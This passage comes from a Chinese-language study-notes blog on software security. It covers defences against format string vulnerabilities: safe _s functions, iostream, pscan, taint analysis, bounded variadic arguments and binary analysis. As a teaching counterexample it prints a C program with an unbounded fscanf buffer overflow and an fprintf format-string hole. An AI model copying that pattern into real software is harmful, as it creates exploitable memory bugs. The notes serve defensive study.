<p>（2）这些格式化输出函数有着<strong>不带_s后缀的原型对应物：不支持格式转换指示符%n；</strong>并且<strong>如果指针为空的话，它们将其视作约束违例；格式字符串无效。无法防止格式字符串漏洞</strong>，这些漏洞使程序崩溃，或被用于查看内存内容。</p>
<p>4.iostream与stdio</p>
<p>（1）C++程序员能够使用iostream库，这个库提供了通过流来实现输入、输出的功能。格式化输出使用iostream依照<strong>中级二元插入操作符&lt;&lt;**进行实现。**左操作数是待插入数据的流。右操作数则是要插入的值。**格式化和标记化输入是通过**提取操作符&gt;&gt;实现的</strong>。标准的I&#x2F;O流stdin、stdout和stderr被cin、cout和cerr所取代。</p>
<p>（2）极其不安全的stdio实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filename[<span class="number">256</span>];</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="type">char</span> format[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fscanf</span>(<span class="built_in">stdin</span>, <span class="string">&quot;%s&quot;</span>, filename); <span class="comment">// 这个程序容易造成缓冲区溢出</span></span><br><span class="line"><span class="comment">// 从stdin读入一个文件名并尝试打开该文件</span></span><br><span class="line"></span><br><span class="line">f = fopen(filename, <span class="string">&quot;r&quot;</span>); <span class="comment">/* read only */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">sprintf</span>(format, <span class="string">&quot;Error opening file %s\n&quot;</span>, filename);</span><br><span class="line"><span class="comment">// 格式字符串则可能会被利用</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, format); <span class="comment">// 如果打开失败的话会打印一条错读信息</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安全的iostream实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="built_in">string</span> filename;</span><br><span class="line">ifstream ifs;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; filename;</span><br><span class="line">ifs.open(filename.c_str());</span><br><span class="line"><span class="keyword">if</span> (ifs.fail()) &#123;</span><br><span class="line"><span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening &quot;</span> &lt;&lt; filename</span><br><span class="line">&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.测试</p>
<p>（1）很难构建一个<strong>能够覆盖所有路径的测试套件。</strong>格式字符串bug的主要来源在于<strong>错误报告代码。</strong></p>
<p>（2）由于这类代码是<strong>作为异常的结果而被触发执行的，</strong>因此在实际的运行期测试中<strong>这些路径往往被遗漏了。</strong></p>
<p>6.词法分析</p>
<p>（1）<strong>pscan工具是一种词法分析工具</strong>，可以自动扫描源代码中存在的格式字符串漏洞。它以如下规则扫描格式化输出函数：<strong>如果函数最后一个参数是格式字符串且不是静态字符串，则产生一个报告。</strong></p>
<p>（2）<strong>无法侦测传入参数时存在的漏洞。</strong>它在<strong>使用用户或者其他非信任源提供的格式字符串时会产生错误的判断。</strong>词法分析工具最主要的优势在于<strong>速度</strong>。由于词法分析工具缺乏语义知识，<strong>导致很多漏洞无法得到检测。</strong></p>
<p>7.静态污点分析</p>
<p>（1）Shankar描述了一个<strong>用于检测C程序中的格式字符串安全漏洞的系统，</strong>该系统使用了一个<strong>基于约束的类型推断引擎。</strong>来自<strong>非信任源的输入</strong>会被标记为污点。而由<strong>污点源衍生的数据同样会被标记为污点。</strong>对于那些<strong>试图将污点数据解释为格式字符串的操作会产生一个警告。</strong>这个工具是基于cqual扩展类型修饰符框架而构建的。</p>
<p>（2）污点化<strong>利用附加类型修饰符来扩展</strong>现有的C类型系统。标准C类型系统中已经包含了const之类的修饰符。增加一个污点修饰符则允许在使用非信任输入的同时将其标记为污点。例如:tainted int getchar();int main(int argc,tainted char argv[])</p>
<p>（3）<strong>getchar()的返回值和程序的命令行参数都被标记为污点并作为污点值对待。</strong>在给定一套初始污点标注的情况下，就可以推断程序变量<strong>能否被赋予来自某个污点源的值。</strong>如果任何污点类型的表达式被用作了格式字符串，则用户将会<strong>被警告程序中存在潜在的漏洞。</strong></p>
<p>8.调整变参函数的实现</p>
<p>（1）对格式字符串漏洞的利用要求<strong>参数指针被步进超过传递给格式化输出函数的参数数目。</strong>格式字符串使用的参数个数超过了实际传入的实参数量。可以通过<strong>将变参函数的参数个数限制在实际传递的参数个数之内</strong>，从而消除这个基于参数指针步进而导致的利用。</p>
<p>（2）通过传递一个终止参数来判断实参什么时候被用尽是不可能的。ANSI变参函数机制允许任意数据作为参数传递。传递参数的数量给可变函数作为参数。</p>
<p>（3）安全的变参函数实现</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap,v) </span></span><br><span class="line">(ap=(va_list)_ADDRESSOF(v)+_INTSIZEOF(v)); \</span><br><span class="line"><span class="type">int</span> va_count = va_arg(ap, <span class="type">int</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap,t) \</span></span><br><span class="line"><span class="meta">(*(t *)((ap+=_INTSIZEOF(t))-_INTSIZEOF(t))); \ </span></span><br><span class="line"><span class="keyword">if</span>(va_count-- == <span class="number">0</span>) <span class="built_in">abort</span>(); </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> av = <span class="number">-1</span>;</span><br><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">-1</span>); </span><br><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>#define va_start(ap,v)：va_start()宏被展开以初始化存储变参个数的变量va_count</li>
<li>(*(t *)((ap+&#x3D;_INTSIZEOF(t))-_INTSIZEOF(t)));:展开了va_arg()宏，每次<strong>调用它</strong>的时候变量va_count都会减1。</li>
<li>if(va_count– &#x3D;&#x3D; 0) abort()：当va_count等于零时如果再需要参数，则函数失败。当va_arg()函数用尽所有的参数时就非正常终止了。</li>
<li>av &#x3D; average(5, 6, 7, 8, -1)：<strong>works。</strong>第一次调用average()的时候，由于函数选用了<strong>参数为-1作为终止条件，所以执行成功。</strong></li>
<li>av &#x3D; average(5, 6, 7, 8)：<strong>fails。</strong>用户忘记将-1作为参数传给函数。</li>
</ul>
<p>（4）安全的变参函数绑定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">av = average(<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>); <span class="comment">// fails</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">push <span class="number">7</span></span><br><span class="line">push <span class="number">6</span></span><br><span class="line">push <span class="number">4</span> <span class="comment">// 4 var args (and 1 fixed)，包含变参个数的附加参数被插入到第4行</span></span><br><span class="line">push <span class="number">5</span> </span><br><span class="line">call average</span><br><span class="line">add esp, <span class="number">14</span>h</span><br><span class="line">mov dword ptr [av], eax</span><br><span class="line"><span class="comment">// 一个汇编语言指令的例子，这是第6行调用average()函数所需生成的指令，以便处理修改后的变参函数实现</span></span><br></pre></td></tr></table></figure>

<p>9.静态二进制分析</p>
<p>（1）printf()函数应该接受最少2个参数：一个格式化字符串和一个参数。如果printf()只有一个参数并且该参数可变，那么这个调用也许就表示有可利用的漏洞存在。</p>
<p>（2）传递给可变参数函数的参数个数<strong>可以通过检查函数的参数修正值进行确定。</strong>例如由于栈修正值是4，<strong>很明显只有一个参数被传递给了printf()。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2087.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
</search>
